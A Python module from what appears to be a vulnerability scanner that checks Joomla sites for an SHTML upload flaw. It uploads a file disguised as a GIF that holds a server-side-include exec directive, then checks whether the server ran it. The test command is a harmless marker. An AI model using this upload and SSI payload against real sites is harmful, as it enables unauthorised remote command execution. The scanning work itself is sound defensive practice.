from __future__ import annotations

from typing import Any

from ...core.probes import rand_str
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding
from .convertforms_probe import probe_upload
from .joomla_media_probe import probe_media_upload

CVE_ID = "CVE-2026-73373"
NAME = "Joomla unrestricted SHTML upload"
AFFECTED_RULE = "Joomla 1.0.0-5.4.7 and 6.0.0-6.1.2"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("1.0.0") <= parsed < parse_version_required("5.4.8"):
        return "LIKELY_VULNERABLE"
    if parse_version_required("6.0.0") <= parsed < parse_version_required("6.1.3"):
        return "LIKELY_VULNERABLE"
    if parsed >= parse_version_required("5.4.8"):
        return "PATCHED"
    return "NOT_AFFECTED"


def passive_check(
    target_url: str,
    joomla_version: str | None = None,
    **kwargs: Any,
):
    finding = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation="Upgrade to Joomla 5.4.8, 6.1.3, or newer and inspect writable media directories for SHTML files.",
    )
    finding.exploit_available = True
    return finding


def run_safe_probe(
    target_url: str,
    joomla_version: str | None,
    timeout: int = 12,
    proxy: str | None = None,
):
    passive = passive_check(target_url, joomla_version)
    if passive.status != "LIKELY_VULNERABLE":
        passive.detail += " Safe proof skipped because the detected version is not in the affected range."
        return passive

    marker = f"PROOFCMS_SHTML_{rand_str(12)}"
    execution_marker = f"{marker}_EXEC"
    filename = f"proofcms-{rand_str(8)}.shtml"
    payload = (f'GIF89a\n{marker}\n<!--#exec cmd="printf {execution_marker}" -->\n').encode()
    proof = probe_media_upload(
        target_url,
        filename=filename,
        payload=payload,
        marker=marker,
        content_type="image/gif",
        timeout=timeout,
        proxy=proxy,
    )
    proof_source = "Joomla com_media"
    if not proof.get("accepted"):
        convertforms_proof = probe_upload(
            target_url,
            filename=filename,
            payload=payload,
            content_type="image/gif",
            timeout=timeout,
            proxy=proxy,
        )
        if convertforms_proof.get("accepted"):
            proof = convertforms_proof
            proof_source = "Convert Forms"
        else:
            proof["convertforms_fields_found"] = convertforms_proof.get("fields_found", 0)
            proof["attempts"] = list(proof.get("attempts", [])) + list(convertforms_proof.get("attempts", []))
    passive.exploit_ran = True
    if not proof.get("accepted"):
        passive.status = "NOT_CONFIRMED"
        passive.confidence = "MEDIUM"
        passive.detail = (
            "The SHTML upload was not confirmed through the public Joomla media or Convert Forms adapters. "
            f"com_media exposed: {proof.get('surface_found', False)}; Convert Forms fields discovered: "
            f"{proof.get('convertforms_fields_found', proof.get('fields_found', 0))}. "
            f"Attempts: {'; '.join(proof.get('attempts', [])) or 'none'}."
        )
        passive.action = (
            "Upgrade to Joomla 5.4.8, 6.1.3, or newer. A conclusive remote proof requires an accessible upload surface."
        )
        return passive

    response_body = proof.get("proof_body", "") or proof.get("response", {}).get("body", "")
    passive.proof_url = proof["proof_url"]
    passive.uploaded_filename = proof["uploaded_filename"]
    if execution_marker in response_body and "#exec" not in response_body:
        passive.status = "VULNERABLE"
        passive.confidence = "CONFIRMED"
        passive.detail = (
            "SHTML acceptance and server-side SSI command execution were confirmed with a harmless marker command."
        )
    else:
        passive.status = "VULNERABLE_UPLOAD_ONLY"
        passive.confidence = "CONFIRMED"
        passive.detail = (
            "The SHTML file was accepted and retrieved, confirming the dangerous file-type filter bypass, "
            f"through {proof_source}, but this server did not execute its SSI directive."
        )
    passive.action = f"Upgrade to Joomla 5.4.8, 6.1.3, or newer and delete {proof['uploaded_filename']} from the Joomla temporary directory."
    return passive


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    **kwargs: Any,
):
    if run_exploit_check:
        if exploit_mode != "safe":
            result = passive_check(target_url, joomla_version)
            result.detail += " This module only supports safe verification."
            return result
        return run_safe_probe(target_url, joomla_version, timeout=timeout, proxy=proxy)
    return passive_check(target_url, joomla_version)


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": [">=1.0.0,<5.4.8", ">=6.0.0,<6.1.3"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": False,
        "module_version": "1.1.0",
        "last_reviewed": "2026-09-29",
        "updated": "2026-09-29",
        "required_detectors": ["convertforms"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-73373",
            "https://developer.joomla.org/security-centre/1077-20260810-core-unrestricted-uploads-of-shtml-files.html",
        ],
    }
